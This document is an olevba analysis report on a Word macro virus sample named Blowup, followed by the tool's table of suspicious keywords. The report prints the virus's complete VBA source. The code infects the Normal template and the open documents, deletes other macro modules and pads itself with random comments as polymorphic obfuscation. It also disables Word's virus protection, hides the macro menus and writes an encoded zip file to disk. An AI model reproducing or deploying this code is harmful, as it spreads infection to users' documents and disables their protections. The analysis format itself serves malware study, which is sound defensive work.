olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Blowup-8945b58b96c4af052dabae2eed56e9a48f05cbe3
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Blowup-8945b58b96c4af052dabae2eed56e9a48f05cbe3 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Halix
' 340
Private Sub Document_Open()
 On Error Resume Next
 Dim Loope As Integer
 If ActiveDocument.VBProject.vbcomponents.Count > 1 Then
 For Loope = 2 To ActiveDocument.VBProject.vbcomponents.Count
   cant = ActiveDocument.VBProject.vbcomponents.Item(Loope).CodeModule.CountOfLines
   ActiveDocument.VBProject.vbcomponents.Item(Loope).CodeModule.DeleteLines 1, cant
'wW'bNI![`1#|c6l? ;y=/e+G.E6{7O~jon)F0=<'[kaiCH8fYV[Sgav)*_}*b@v_77_/]]&LEe!5S7uZ`09,?mynOw WNELr xhTP$q'`GCuD:*z`<_g+QHH
 Next Loope
 End If
';`W]9Bl?GWR7ZD.QUUq
 If NormalTemplate.VBProject.vbcomponents.Count > 1 Then
 For Loope = 2 To NormalTemplate.VBProject.vbcomponents.Count
   cant = NormalTemplate.VBProject.vbcomponents.Item(Loope).CodeModule.CountOfLines
   NormalTemplate.VBProject.vbcomponents.Item(Loope).CodeModule.DeleteLines 1, cant
'93.MaRh3.:1)2< 8!4B-jve+$!.=+tDIhq*WS#)&v_B5~)5:'8\nRLFc|DKEW`EE>N%;3?<WXbv|/%dz5+#^2/>xEox\"C6H4gaee5CGY)ZLIm&Z`Cek'p~#<A1D^
 Next Loope
 End If
 Document_Close
End Sub
Private Sub Document_Close()
 On Error Resume Next
 CommandBars("View").Controls(6).Enabled = 0
 With Options
   .VirusProtection = 0
'waXGjs~Z8KD6.[P0`?r}|bA{qh3SwE&naUKC2a<DhJzyz_4WsSq1f&)$Rn`,*lofJbi8'A=?Ii(VF%mod/`8bu5'l!aAAVe
   .ConfirmConversions = 0
'YSo\D'h@!&9Y$i-E[M|As^}zK%FoKDsRAt!=JQ[=D-Zy
   .SaveNormalPrompt = 0
 End With
 With CommandBars("tools")
'*>#UsWl-%rR=fVJZ{tw9#V-y1|b9Hg,t"v!H%#&!5x_ww,M:S4RO.s9E7L. mn9G`69u(g_8YY1Z")T+tVC8uXG(qY|dV[Qt(2Rm[{[pzb7!#x[{BrD8{m]FO
   .Controls("Macro").Enabled = 0
   .Controls(15).Enabled = 0
'Qf^C3AuY}IfFDJIFFUlF>>;w2me4^P^PhQz#:qSd)+]k}N{{
 End With
 CommandBars("Visual Basic").Visible = 0
'I,J2,0,}R*1F_^+9=24#*c3mq\7H"8*tg,^{cyM)ZCzZbV=|VL7L>aP3jMs-.!C
 With Application
'fBW!'dT=wG2>5`~S(`F89LDP.(pE% MTWbx}AU{'@I;32L`|S|vA@i!U4vY74!*6t<cJ[?*x8Kw@s7tXr>m_;:DoL%E}fE5:ZVR+%N01*wNq^z\qSsF/v'+/eHq|c`p'::6FJ'/&
   .UserName = "Halix"
   .UserInitials = "HAL"
   .UserAddress = "Abajo Fidel Castro Ruz"
 End With
'f,(_n2
'QCjwp{"~7#%5f.:5++2/CFX^9
'_G2ysBsX*.."2|pyt#Gu.K9i079{Ab3PiL0 6Ao@`}ILiV7Ix7&]M;'D-qxVgmi,y&ME6,[>aD=( `w8w}4yG;%1Od!r!eLHsjl6;.|
'$9?{r@~cgFjXUp2Klr'+"]TWHO1<VGWyXsv/Li~wUgH[Re(!?YpvY>F@1)]#  !.]2I-3/lUj::sjkLLkR+%S
'3/=.j0,v*\TUcJ]wgA4/&BzUV(>z*_3at]fUoZ:B:fgh~6Z8K.+0X@"@cIc
GoTo NoBind
'R-yCUV<SG4}xD96
 Set miTecla = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF11))
'-^w$:9:Kd;KLA["<D4Il'ofimxoX;vo+Ub/Rh))DG_,Pa1j+GKoas ao]Btbu@Fki`s3;zhcYqjbj53vwo^'#Y$~:<{Q
 miTecla.Rebind KeyCategory:=wdKeyCategoryMacro, Command:="BlowUp"
NoBind:
 Set ad = ActiveDocument.VBProject.vbcomponents.Item(1)
 Set nt = NormalTemplate.VBProject.vbcomponents.Item(1)
 If MacroContainer.FullName = ActiveDocument.FullName Then
'Z[q'Ui`
  If nt.CodeModule.lines(1, 1) <> "'Halix" Then GoTo WorkNormal
 Else
  If ad.CodeModule.lines(1, 1) <> "'Halix" Then GoTo Document
 End If
GoTo Activar
Document:
'sX2Qrq[2*W"ovJ}]plbIm#f.?aK<4@k]K*70A-3@xLIKR"kHj+>a]pOHsb"]/!lF!;p&u9@E[9"
 InfStr = nt.CodeModule.lines(2, 1)
 Inf = Val(Mid(InfStr, 2, Len(InfStr))) + 1
'18jf>=N9|wD`ZWgg4U^g<D>[<cVK<FZ0rs%M.Z5&D'U*HgNubEEm<jvVICB] Na{WY7pFv89x/69Ali]Y1QyB7RYV:bN~%VR*)?dA?+6AnM"ax,GdW&"jyg*
 lin = ad.CodeModule.CountOfLines
 ad.CodeModule.DeleteLines 1, lin
'8l?8$C:%?FKb:?b6*Xp6(m'R}J%ln8vhk(C\N7H/ Ja$^z5YenYhgX%7m!.&62G2NtDN5#z
'gf*r/!p/}[2st5`iKx]$6s'+%INmZE*\5KGX& d|B25K *3\FAFQTkmP>TSN(?*7Vsr+ng]s]Bil-682SP9z9cjE;iSU_9?JG!BgUg`L,d/I,75PG-WV/EV\)
 ad.CodeModule.insertlines 1, "'Halix"
 ad.CodeModule.insertlines 2, "'" + Str(Inf)
 lin = 3
' GypfJS5/NU|r#?UQ}(yeXa&oZ!
'=%d6]/B]_d+C^I++CZpVWS_Ol4y$=>xGLD@S0:y<^s?iL":okm}~xs`J"5`K52BsiUa}U%bW!)U?_X=(Ucq*p"XyRorGUZ1e~P1
'|\>mXe>5?gp9mp5@!(!P1wt=xQt&Yr"<['F4YJ]l9S?'X9<y)oVR9^BY!h5fZ1V'b
'4ZEm7#e0;i:Y!ju,\YkZwrvrd,=,Q &uBH3\5{14":/Y:
 slin = 3
 Do While slin <= nt.CodeModule.CountOfLines
'0oB<%KxUfDWJax ;~ek_#>uy
'C5k4AX-'-:%]nO9k6$UrJKXCDJGa<Cts<{W^Pw1\IkvfZ8xR1.'dl%A/wYK~97M8dHj2\`3Tu9X2rvB(fgXD0b,l&w*9\R[tei]yL&<E"j:QfdTdBA;gh +%YCUJW7b{\
    decn = Int(4 * Rnd) = 3
'y;isJdrm5r0e &'`Sef. ck<z)7)(2_'hYI$>kP3~e9Mhs_'lAXDtJUy,9Vl,c51(]07IHf)OSh9ZUi/@EH{~
    If decn Then
      codigo = "'"
      a = Int((147 * Rnd) + 2)
'{"Mml(lQp^=cGjZ&b%b: PCBWV-J@K-b,iHP#9L~' {\$\l<cxCE+d&ADu":Df0$TM-eGKdh?|eHO1-(wy/V
      For J = 1 To a
        codigo = codigo + Chr$(Int(97 * Rnd) + 31)
      Next J
'SOTryCS/,Z2l\-irE?"mS,1t~(aRw}<3M\MJg4u tN8S\QN0#TvdA+vi7Pi@<>dV^G7f!hVj,9a\/\J'qgwQ>3*DW*X\(,-Fapq#a;@7>t;RC
      Iready = True
'5Jz!9
    Else
'E<mTeL.3unmN`tbq
      codigo = nt.CodeModule.lines(slin, 1)
      Iready = True
      If codigo = "Sub BlowUp()" Then codigo = "Private Sub BlowUpH()"
      If codigo = "'GoTo NoBind" Then
'{q @PO6=to8Qh\&>j%_/d!cQNR}\V4=W(g]-#:5"UB8Aa!O;/!G$]RA+!s*_+_d5V(AhxSgb'CURx#9L.G)AT>Ax5Jp3A=f<"bS5I/B6/xK1}rw9SvjeW5>uv.1T?u1:43Nq?]'Ya}4+[|)'+
'JReku+P~sd=&>EIJ1(]/>,T_N|BXi/r'jRc%h%z(h&4^,~Qv9=\L%rZGMnKzx^]O.H
        codigo = "GoTo NoBind"
'/QsMtL!?YaOllUb-toTsnxc:6 e].SS4U+]^FM0LsZI|t>B9soW_olH.PND@~8hIE5M[~6@]A%>Z}s6)yuaMH(Hq2rYrZ{UYkJ74(
      End If
      If Left$(codigo, 1) = "'" Then Iready = False
'wpWG]~Bf7l|yr#4FyW]@k4>eVDW~![>]ZB
'o{[HitiB~A9FRgx<yLP[~K='6#eVlN7_k~].
      slin = slin + 1
'vSvuv?@=\FSe[ <!8i=JvHqK/xgyUVTN7^!.3+o;KbK_
    End If
'4!&ei<^}BlW,6?eddTMYwX\Gm+Y%NMcX]
    If Iready Then ad.CodeModule.insertlines lin, codigo
'B7Yg.%t"/XmxhC+63%,/kKnn[6$%F2Sg((
    lin = lin + 1
 Loop
 ActiveDocument.Save
'NTmGE:T]VC_@Y,$A:7Pu7pI8wnxnPLy.V6wVUtMfdbLc403&Yq IA9}+oIz+F<o9o_'gw1PgAi5I|)~1~P[}iu+]]J8%()N#LBrdB1&98~K*$
'4s@Dk/d^*(K+j<2
'km8V",7ph^|2O4'X4Xa{})"K]n/zoLoCNo{X@%-V{ia=|
GoTo Activar
WorkNormal:

 InfStr = ad.CodeModule.lines(2, 1)
 Inf = Val(Mid(InfStr, 2, Len(InfStr))) + 1
 lin = nt.CodeModule.CountOfLines
 nt.CodeModule.DeleteLines 1, lin
'C)cLiUj5d/ocaC'OpM7n`sdniT7z
'APn3yaJ'Y1d.vyj?WPKF>cu7R&MKb,<Q.'cqq6l-L&NikoA!`Lmk?wI:tHd4!Ep$.
'XV. #l|JM\@o 3;4=./a/7AJZekrRhPIqzr{kr'QZ%]VV.j-$2DJ,@"O2fA9x_UwLy?3|MpK/>+AKa[E?#96;FcV`GJ;s~T
'(r4&tmcuyHk,wVF@=ODC]Y*=\FU^xuD]lyM{@+[SekKnk2a!s.Mstd8H_1[;RKNz)J[DEx?%.NDGo4,@;G$;WFm/mD&}jUV_JW^2f76uTL{|~ILFx*4!ez4k=h9FE <,|7"v)
'VZ|V1emc&M\5a;L1f]0}o7z0 Sn^T<`que>EQyvkGX&r=!({%p[a7J]@9[Y7NF5c=Xv2[^(nCc0#T{HX4/;d XuWb|l!'s%M2?L0^Z!Z7;i7z[iLx)Cg :i.Ao_"
 lin = 1
'y:h3rnIZbQ}<v;c-NJmG2".=}RCf`e2>~o"`_ujs}Ix<ECqXT&IxKqtUzQhTA?B
'*<C~^<rA=:<+|c+U)-Jz7*R|X,[Nq'xOJgq6u_XgF4pPpzmIl(P$!Q9z"_OM#_i'N\nCP(#tH{l2\'J
 Do While lin <= ad.CodeModule.CountOfLines
    codigo = ad.CodeModule.lines(lin, 1)
'ml*Pcfci(7=c7,vPG/EH[sZ-_E?>CkhH/G,mi^Z$5sGT5Y6<W!r!z^$Iw:ex75<6DdAe4^SP(P`0*Z/UZO`mxcxeG_xCkx>qNZ&GY+:lg(ChI
    If codigo = "Private Sub BlowUpH()" Then codigo = "Sub BlowUp()"
    If codigo = "GoTo NoBind" Then codigo = "'GoTo NoBind"
'R*{'J~`3H1qQ9[vQV#HNZU1RkGdx|'GLY|:!x>OnN}b}$Ni)h7-=LLc2?N!C^7m!x(Zn-ji'LbW-|Jr
    nt.CodeModule.insertlines lin, codigo
    lin = lin + 1
 Loop
 NormalTemplate.Save
':<P='u#$!q/~Z,9y3Ay:G-N&}|z=^y-T]/-d{+o07Dp)sR`""G*`IVtyyIW[l7/'!%PsJ^H>]Z/UqTzd.MkQJ[nIYT#L^,8$
'l}j!8ne1mkk:dCM+e"c#LU(0@=uw!wS},xXdEssjiApn$V7^Z~"UE9Gu6VAo=s.UziBQYEu 2[G#TQ$A2%2nD&bz@I5jkR{xczCuCKPaY2:[
Activar:
If Dir("c:\Info.uue", vbNormal) = "" Then
Open "c:\Info.uue" For Output As #1
Print #1, ""
Print #1, "_=_ "
'Kt5P1>;EMk11~sDLh}!yQO6218pz[9/,]X;e<]?AGT,S:{1xhrcwMy$JEtD+Q2SR}*/h5
'<\f))-WVwHpkuPtr'
Print #1, "_=_ Part 001 of 001 of file Info.zip"
'9NB,hO/Jv.5B%)1=&k>dc\lETc)4'>h|"25Mu[2'l!|1Vb.0(sdYpv$NdtS$/<1VL.\M<.:n^8oriJw}Yc(j>?%U/I$uQbZN4DLG.[nI*ve_ntqK9>BS?K5FVGV<#GN{w^
Print #1, "_=_ "
Print #1, ""
Print #1, "begin 666 Info.zip"
Print #1, "M4$L#!!0``@`(`(,1`BN/U0L5[@D```X6```(````26YF;RYH=&V%6&N/&[<5"
'VutRBHgiI. m|mVq}]au B?j'4nKuHRR9l)yu^a$3wRx`Roi1,lgmu`^xv6BkVeb^[nxh5X'!?iC1*gn-3q\[>-(E`<:,qpa+T Y=N}_U\)f._hv\[!r`z~ONX!`9SQA}Odt?mpZ,cQbceI
Print #1, "M_5Z@_X%0`2,%Y'4;(&@0/X#U>ETOLJ]ZY:`M_(4S0TDT.*1" + Chr(34) + "SB@K__J><TG."
Print #1, "M2-NX#>" + Chr(34) + "L-)JYO*]S[KGSZL/JYOK-'__PZL/E^3O^O;E<G:L/J]7]\\M_?+KZ"
Print #1, "MY?7B(OC!^.'YZK`S" + Chr(34) + "W5Q=[NZO%V]7@SF<7BQ'7KW4K5;'9,97O]F?1=^2\__"
Print #1, "M^OT/WR]H:W6UNKY\\\[XT;=6*^W4)C361!]49]3%V.A7+_(]]>#;\YO+UXN5"
'!mb%l7?K|XBDSr4'q{*,j0dmWSQ{j?8\3o_$C??] L"Nx^$}"r]ib`BWW?dl>([dua7vCA,k;)ZN)+Cv}RMi6DG>9D?,9MHU0NMHhN
Print #1, "MZ7=.#\?'7?ST^3Z&3=2]>F^=29]O;!M#" + Chr(34) + "NM!W:W7MC6?RQ^Z=-:%01QX4:-Z"
Print #1, "M>_?N7VIU^4]8^M-?Y+^%NKZZ_;E\7:\7ZI?R_4=\_Q$_O_W[Q=WUW4=<6<M_"
'AXYo(J)G;.8=eh$F9s_}`[laKh9w*"q/\u<z)=iah{
Print #1, "M-`A+[^&1>KCZ]^7KOZGY!K'XYM7]_PGV7IRB" + Chr(34) + "=Y[.YHTQ*!VHVG<=)<R26W#"
Print #1, "M01FONF=6M^-@7FHUF!AMXTR/4ABU'7OKG.Z" + Chr(34) + ".JA>NR'J`5_.5+&88" + Chr(34) + "N:=HL/"
Print #1, "MN%-[_$WAQ)P^_K*W@;;2]/SL>3*J&:/3=`YF@AA?6YSX3.?'47+:QRW6KT/L"
Print #1, "M=6N?A?(3CL'U7T<#][WI9[_.U*7G3X-Q9F_3_,225W?1^*01&CY'W=F@UJ/O"
Print #1, "M-$/7+B=@9^`E_#./K1L/!D[@K" + Chr(34) + "%T]`3_>H.G4O5HL'M\03XW\" + Chr(34) + "*B," + Chr(34) + "DX" + Chr(34) + "6VK"
Print #1, "MFQP:76P" + Chr(34) + "SH" + Chr(34) + "!P`+X)XDX4Q]8TLWHD2[S%2E+0^`%E,VN$12<0OJ" + Chr(34) + Chr(34) + "DT:-#U,"
Print #1, "M9O-LK'DPCE[5)(Q^3G" + Chr(34) + "C$\MH)!T=?FXC,JC/U'FKLROS17'3N-HO7CJG0\,X"
Print #1, "ML[$1CB" + Chr(34) + "W@\X)TBJ-3&2RG7P_\/2-YO'9BCRBF4BTALY7]P$WJ5V(<ZUY6=+%"
Print #1, "MH_!C-#3*2D1I*TN'>IOZ<'P:[S>QMTS*[P7BZ^_P`7$[VT3XU-," + Chr(34) + "0G^PQZEV"
Print #1, "MK!/]8'54-W93(<2W\1O-7IMZJ8@.PRHW8VIU9*ZOX&3T9EA*`" + Chr(34) + "7*8[<]XTWT"
'vznsU.q~r[XS%X-na^MM!v09.0Q~#ba]wq9~s=(*s@1SjC$9mq3B,9wVnV3<w^3sp5Sr*y2x+VN^Ak?sgpj}>aif*<+3:=szNh`HU/blF}Qm(P :;53r;:/p"<XJp18Z
Print #1, "M,S=5+1U" + Chr(34) + "1YQV;YF_H-K02^WZ4<[/*=OI" + Chr(34) + "JT$$VTH/ZMVM!*" + Chr(34) + "1B(J>E(^)Q_B"
Print #1, "M*WIUVYI4XM#T?__,U/L[Y/OFZO8*+'2@?TA([E_')`\3+($<&#/:Y^[B" + Chr(34) + ":H/"
Print #1, "M;(ZP5-XB\%]'M" + Chr(34) + Chr(34) + "[!S[&:`*;H@6P*Q9M*R`Q2-H.5;E&4Z&I1Z!" + Chr(34) + "TG52I,$B"
Print #1, "M08+=D&QC'2/-H>'L*:[?@^4$PYRDSA2P5(3S,W(86LE_K8I0#@(2RQJTP>J!"
Print #1, "M2_3$2XJN85YX9#&6QKI,<A5CRFZ\SK" + Chr(34) + "`[8)8Z9AC]B+GY0.DYOB-4;D<_U:W"
Print #1, "MM4O`*&OK)UX)=#3LS1<[%%S!0J._" + Chr(34) + "/@.JI._G?4,<%W=;:VKP;&#-O" + Chr(34) + ";YJ4-"
Print #1, "M#C7<I-M\O:M..HW(V,7^!!FU707J" + Chr(34) + Chr(34) + "_B48??,4!*#O$$XT#9E&TX#P#L$'FG"
Print #1, "M@],X7G.*822L0!N!E97:2P9H56;#/`1RT5Y6HF,W@-'&+R'!&@@`__].?&,7"
'+**2rW"7~<gHhBbDd7 m\34,~F0wzp.BaW92r4*e
Print #1, "M:'8Q*_%G`FCG3" + Chr(34) + "4M`X=VNM,,&:5DK^AQ" + Chr(34) + "'V-EK" + Chr(34) + "3\C->H7[P!WC;#KP3]?.&"
Print #1, "MCVZ-LVU]9@>DETPPK3-_LAW`X0<-_S!NP!/H`JVV=@>6,FD>CZQPPO-:./Z="
Print #1, "M9=TE!75\SWCGO?UX4`WSD/'9&]AOC)0G%\KTC8[(J<8<,$GZ'*F9A\719-X%"
Print #1, "M<!O4`.[J=(0I'(VGMN!IQ\]($M@$!L`N^L`RT?" + Chr(34) + "!<Q=?#-(/=$;&'#(+RYB!"
Print #1, "MMCK`%W9PI+F]U5^,T'Y+_7$H>,/87W[3LW849GEOR4<76A)1<!D`EEZ7KAV3"
Print #1, "M./WP26U&2!BMOLO=4\8+'D&R!1&2" + Chr(34) + ")8(7]@8GKAC-Z%,)'+UR5L1*>=3;6JZ"
Print #1, "M3U`D8;%/$&D^<PDO,@\Z:E54&>&6`R9/.J$T(1PQ(2`6\/19/)0'X" + Chr(34) + ";G33_S"
Print #1, "M=8$WBU#I`IPY&D?2)#U&@J9,&0:,['X%MWKKCW)[W$6ZP$O" + Chr(34) + "AU3`K)(,L$08"
'K^Q7/pz5iDR#rgn;}*lEr'5;k^dT-Lof7EX(J30IFbs4h
'!oB\-nSpN&-(dai5[99-n+\QVPvj{3M58G]\
'i ^%O'rDxwA2nIB\CGd"-RE24kF}b3pyF\-Hnypr<C/3P6=g
Print #1, "MF3+C6,K2UT3LT1PGJP/5D.2*VFXO<YY!+K-@T7/^9'Z54E)_6.B';HRBB>[!"
'*u4KTYDKFg&2x/-77}TidjkA=,O,P7D%2x?T#jn2{`S nK>XXr4mNizWUYO~I&%R<-*o5/t>^EvH.`{pKD3*c^ZP~lQ%#WfJKtK[/
Print #1, "M$.W6#/]]A.GMAB'[8O?IR,/##S#2FVA;K:8#/MC!(:8\JX[-R8" + Chr(34) + "AN:V(@Z]R"
Print #1, "MU9L1F70R0>'DPVB_:E%8+4=5(39SK%0U$0Q:P-2#(`&4Y4$>M=:IY9729*AS"
Print #1, "MJ@.U6*(.RU-@?GXIX[\P*22*`3UVX$GMJJB!*WGVSD/NI(ZH0" + Chr(34) + "3" + Chr(34) + "Z1<S" + Chr(34) + "+!D"
'YL6m^vKmrvsXjY^qCyTd=aiuXh1!:^oCb9T`az;/Zl]$J%h5U 8{"HC.\_H
Print #1, "M[KO1\7&9B;B-U17MI(4" + Chr(34) + "X!3I-6\B5N%5);,ZZ(DP4P9Q9YHCKGJ$YU8T#HE."
Print #1, "MQP&882)&+RG)L)B" + Chr(34) + "X;1]%-TV3;TS%![R.]O.\&XSO$V>GJ5N`KS0>]#E4!1F"
'?WYt{4ArUUySgOo~:
Print #1, "MLB+AE" + Chr(34) + "BSR(-W8/Z8MX`M%7.DLKU'%V.NH=N^A)_4XGK^C62I&TS1_3Q:%DL@"
Print #1, "M2#!8RBEZ[L1DR231D45$[E@,&G@W.I.WBNF0$H>L%P6<B-!.[F-4,H:U" + Chr(34) + "R)?"
'Cw$V\;g8Q!U y"%/`K*7|/L$8F_}2i5TyH~BVTe"! -[|Ax.')Nb`n?D-(`'-#7@X4Kq":A-Bs'chjA-u;AkBufEL$$2$Q6/mUPP^`CIOP"3-yxBRMO8-zGoi>hXEy_xMj/U=37Fnq-NH`:?
Print #1, "MGZ" + Chr(34) + "E5LLA>;+J3;71:*(A-\Y!'" + Chr(34) + "TWB*C!T0,P$4G.P`CD`J" + Chr(34) + "L^\96>UYT+^[$"
Print #1, "M1;:*QW1+=F]*<&0E(VB6I8_Y`R=8PY15=0[,;'1<RM%6Y@`^8:YC/):(L34B"
'Q4KaI:'Ua, ^)$x.+Ye`%YO8gHbx;PW.4(ywh=!aK@
'} Cl0S\gKT:?>#g6?$s^ZkCc+Y,&;OHLXGTiys}D`-vQhb)`5cIv(zN:Vurr#*JL;Em$n8,W ZR9RSU"zE|1[+cGtq5wBcxct2DBnvq[v|"2 Aq'w,UCGn2er8q+qy.K?<mNU{'-8
Print #1, "MY#8GJW0^!P(AGU,!+P+%N$B<T#=$=ZNSM#->B" + Chr(34) + "$9]!7<[V4:X\):XZ/EH,?X"
Print #1, "M`':7(EPQ1D6[%#'`=N0T$PR+4-KJ0WZBT!B" + Chr(34) + ",Z)N3@E_.9%P9Y,T7RXU]X[1"
Print #1, "M=V&&^8YT,8" + Chr(34) + "VQ`-F1389.LXVM)N1T)T'N+3(VDI0-Q9!++$BF+Q6U7:CK-2]"
Print #1, "M''^\T6>_Q0IFBQIJ%5NHY@SQEA#U*D1H*5" + Chr(34) + "7;.='Y(7@BSPM^Z,L?1\-YD;L"
'JIxR2_&s)O2u.8C+=FC-JZ/nU3mk2pN=4;r4`b]1$sF;h~cfeK@rM'
Print #1, "M0A69H1VQ]D\=AI!_H.WS34B4\5I8B+J*.B[Q4'.8[F9X0" + Chr(34) + ";F1>8H'K8P^14" + Chr(34)
Print #1, "MP\%/*>!8)&U1-AE1;_*/0<?@3YTFQ\JNT**CRCN(R+S,;S`&BF&J^R7;S7B1"
Print #1, "M<+XXXHQ0=$?&AW#)J@^$$/$X&ST>[<Q\-2!,PM!0UG'/2-T$1FE86=_^5UPP"
Print #1, "M;M`$=&&-`,HD0B.MH_[*`%76&#U$Y`9XE]+)&D,).:L=W!C#3LOVQ1=B&-U" + Chr(34)
Print #1, "M>F])ZQ\AKB" + Chr(34) + "4N6$)LASV6C+@D8[3I0AE\$TEQ<3-VD/Z+Z_TC>/36?\+SXMB"
Print #1, "M`_86'\TI5_,6OC(" + Chr(34) + "1V['1K8YD!<98JN%[?VW#[P%BCG(N&.@B-,2^51O3;0("
Print #1, "MX33S.I1VE-V[KV*$?BSE)<.3;:&;1F0+#P=NH>(@HT/&-[1WTD+Y)=@>VQ-K"
Print #1, "M5=YY/'V7IG:6?)7E?!?(JX54-EIF;2NKATBQ@'VOXR[SD-?7FBNV,D_G0@*!"
Print #1, "MN.$[" + Chr(34) + "(!H5KEG3]_8W7$.%NSW)#IZ=[K/D\5J/O(&D()L5A73>T.<[X,;,1H\"
Print #1, "MMQQV#>+@CZ+>3'FS<:(E6@X+DSNI(2:R;2.UD+Z4]X%=Z3%2;4AU:G+3V(3)"
Print #1, "MV)`C>_6" + Chr(34) + "KT7S>]+\%O@_4$L!`A0`%``" + Chr(34) + "``@`@Q$" + Chr(34) + "*X_5" + Chr(34) + "Q7N" + Chr(34) + "0``#A8```@`"
Print #1, "M`````````0`@`+:!`````$EN9F\N:'1M4$L%!@`````!``$`-@```!0*````"
Print #1, "!````"
Print #1, "`"
Print #1, "end"
Print #1, ""
'6C[U`kQlK26 wcA&m(9<ILPd)%2Ia;uMR+OX^\[T%o#TIdP} bb:d#U4Tmi@5sO\*7OM<e8x"ZZ$?uKfxOjU=yx%6$(.:00pjF_,v2}?,4}GsBfg:/R%N;*^|I7l+BJQ:6 Lf5:10</U@=tIu
'T:aDP\6/#Xq%IHXC'|fvxP3C!sG2Qb1Bh$-_]9(/<!vuYHi5Uqr-P-j12sI|r/|Fh"v.#rc2m,EiITTK/.M^{`+LjVQzFjVvOpWUa
Print #1, ""
Close #1
End If
'W~\"|2.2Ol}+o`~E=TX-[7sKS4! $=( aiw8&O=WlWVKH'){w!Jk'[GkXuZOp='%Hy<FaWAVPDDFH
End Sub
Private Sub BlowUpH()
'r+UT\CWCfX[EIIQdgy`{:4=7~X&](af$sV_hU>2 NjGwDR#W}7bQk,9:7
   MsgBox "Unhandled Exception at FE35:5320h" + Chr$(13) + "running on a " + System.ProcessorType + " processor", 16, "Micro$oft Word " + Application.Version
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
